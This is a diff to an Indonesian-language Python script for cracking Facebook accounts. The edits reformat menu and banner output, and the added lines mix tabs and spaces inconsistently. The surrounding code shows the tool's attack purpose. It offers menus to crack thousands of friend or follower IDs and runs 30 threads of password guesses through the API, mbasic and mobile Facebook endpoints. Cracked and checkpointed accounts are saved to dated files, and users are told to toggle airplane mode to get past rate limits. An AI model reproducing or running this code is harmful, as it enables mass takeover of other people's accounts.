@@ -172,7 +172,7 @@ def menu():
     print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mWhatshap   \x1b[1;93m: \x1b[1;93m0845566xxxx"%(N))
     print(" \x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93m══════════════════════════════════════")
     print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
-    jalan("\n \x1b[1;92m print('%s \x1b[1;92m║'%(O))[ \x1b[1;92mselamat datang Bosku %s%s%s \x1b[1;93m]\n"%(K,nama,N))
+    jalan("\n \x1b[1;92m[ \x1b[1;92mselamat datang Bosku %s%s%s \x1b[1;93m]\n"%(K,nama,N))
     print(" \x1b[1;92m╠══[\x1b[1;93m01\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mID Teman Publik \x1b[1;92m[\x1b[1;93m5000 ID\x1b[1;92m]")
     print(" \x1b[1;92m╠══[\x1b[1;93m02\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mID Teman Massal \x1b[1;92m[\x1b[1;93m5000 ID\x1b[1;92m]")
     print(" \x1b[1;92m╠══[\x1b[1;93m03\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mID Followers \x1b[1;92m[\x1b[1;93m5000 ID\x1b[1;92m]")
@@ -614,14 +614,16 @@ def atursandi():
 		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mpilih jawaban dengan benar\x1b[1;97m!"%(M))
 
 def sandimanual():
-	print("\n \x1b[1;92m[\x1b╠══[1;93m!\x1b[1;92m] \x1b[1;93mgunakan , (koma) \x1b[1;93muntuk pemisah contoh \x1b[1;97m: \x1b[1;93msandi123\x1b[1;97m,sandi12345,\x1b[1;93mdll\x1b[1;97m. \x1b[1;93msetiap kata minimal 6 karakter atau lebih")
+        print('%s \x1b[1;92m║'%(O))
+	print(" \x1b[1;92m[\x1b╠══[1;93m!\x1b[1;92m] \x1b[1;93mgunakan , (koma) \x1b[1;93muntuk pemisah contoh \x1b[1;97m: \x1b[1;93msandi123\x1b[1;97m,sandi12345,\x1b[1;93mdll\x1b[1;97m. \x1b[1;93msetiap kata minimal 6 karakter atau lebih")
 	pwek=raw_input('\n \x1b╠══[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan kata sandi \x1b[1;93m: \x1b[1;92m')
 	print(' \x1b[1;92m[\x1b╠══[1;93m+\x1b[1;92m] \x1b[1;93mcrack dengan sandi -> \x1b[1;92m[ \x1b[1;93m%s%s%s \x1b[1;92m]' % (M, pwek, N))
 	if pwek=="":
 		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
 	elif len(pwek)<=5:
 		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mmasukan sandi minimal 6 angka\x1b[1;97m!"%(M))
-	print("\n \x1b[1;92m[ \x1b[1;93mpilih method version - silahkan coba satu² \x1b[1;92m]\n")
+        print('%s \x1b[1;92m║'%(O))
+	print(" \x1b[1;92m[ \x1b[1;93mpilih method version - silahkan coba satu² \x1b[1;92m]\n")
 	print(" \x1b[1;92m╠══[\x1b[1;93m01\x1b[1;92m] \x1b[1;93mmethod API \x1b[1;92m(\x1b[1;93mfast\x1b[1;92m)")
 	print(" \x1b[1;92m╠══[\x1b[1;93m02\x1b[1;92m] \x1b[1;93mmethod mbasic \x1b[1;92m(\x1b[1;93mslow\x1b[1;92m)")
 	print(" \x1b[1;92m╠══[\x1b[1;93m03\x1b[1;92m] \x1b[1;93mmethod mobile \x1b[1;92m(\x1b[1;93msuper slow\x1b[1;92m)")
@@ -629,16 +631,19 @@ def sandimanual():
 	if ask=="":
 		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
 	elif ask=="1":
-		print('\n \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+                print('%s \x1b[1;92m║'%(O))
+		print(' \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
 		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
-		print('\n \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
+                print('%s \x1b[1;92m║'%(O))
+		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
 				uid, name = user.split("<=>")
 				fall.submit(api, uid, pwek.split(","))
 		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
 	elif ask=="2":
-		print('\n \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+                print('%s \x1b[1;92m║'%(O))
+		print(' \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
 		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
 		print('\n \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
 		with ThreadPoolExecutor(max_workers=30) as fall:
@@ -647,9 +652,11 @@ def sandimanual():
 				fall.submit(mfbasic, uid, pwek.split(","),"https://mbasic.facebook.com")
 		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
 	elif ask=="3":
-		print('\n \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+                print('%s \x1b[1;92m║'%(O))
+		print(' \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
 		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
-		print('\n \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
+                print('%s \x1b[1;92m║'%(O))
+		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
 				uid, name = user.split("<=>")
@@ -657,17 +664,21 @@ def sandimanual():
 		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
 	
 def sandiotomatis():
-	print("\n \x1b[1;92m╠══[ \x1b[1;93mpilih method version - silahkan coba satu² \x1b[1;92m]\n")
+        print('%s \x1b[1;92m║'%(O))
+	print(" \x1b[1;92m╠══[ \x1b[1;93mpilih method version - silahkan coba satu² \x1b[1;92m]\n")
 	print(" \x1b[1;92m╠══[\x1b[1;93m01\x1b[1;92m] \x1b[1;93mmethod API \x1b[1;92m(\x1b[1;93mfast\x1b[1;92m)")
 	print(" \x1b[1;92m╠══[\x1b[1;93m02\x1b[1;92m] \x1b[1;93mmethod mbasic \x1b[1;92m(\x1b[1;93mslow\x1b[1;92m)")
 	print(" \x1b[1;92m╠══[\x1b[1;93m03\x1b[1;92m] \x1b[1;93mmethod mobile \x1b[1;92m(\x1b[1;93msuper slow\x1b[1;92m)")
-	ask=raw_input("\n \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: \x1b[1;92m")
+        print('%s \x1b[1;92m║'%(O))
+	ask=raw_input(" \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: \x1b[1;92m")
 	if ask=="":
 		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
 	elif ask=="1":
-		print('\n \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+                print('%s \x1b[1;92m║'%(O))
+		print(' \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
 		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
-		print('\n \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
+                print('%s \x1b[1;92m║'%(O))
+		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
 				uid, name = user.split("<=>")
@@ -679,9 +690,11 @@ def sandiotomatis():
 				fall.submit(api, uid, pwx)
 		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
 	elif ask=="2":
-		print('\n \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+                print('%s \x1b[1;92m║'%(O))
+		print(' \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
 		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
-		print('\n \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
+                print('%s \x1b[1;92m║'%(O))
+		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
 				uid, name = user.split("<=>")
@@ -693,9 +706,11 @@ def sandiotomatis():
 				fall.submit(mfbasic, uid, pwx,"https://mbasic.facebook.com")
 		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
 	elif ask=="3":
-		print('\n \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+                print('%s \x1b[1;92m║'%(O))
+		print(' \x1b[1;92m╠══[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
 		print(' \x1b[1;93m╠══[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
-		print('\n \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
+                print('%s \x1b[1;92m║'%(O))
+		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mMainkan Mode Pesawat 5detik jika tidak ada hasil\n')
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
 				uid, name = user.split("<=>")
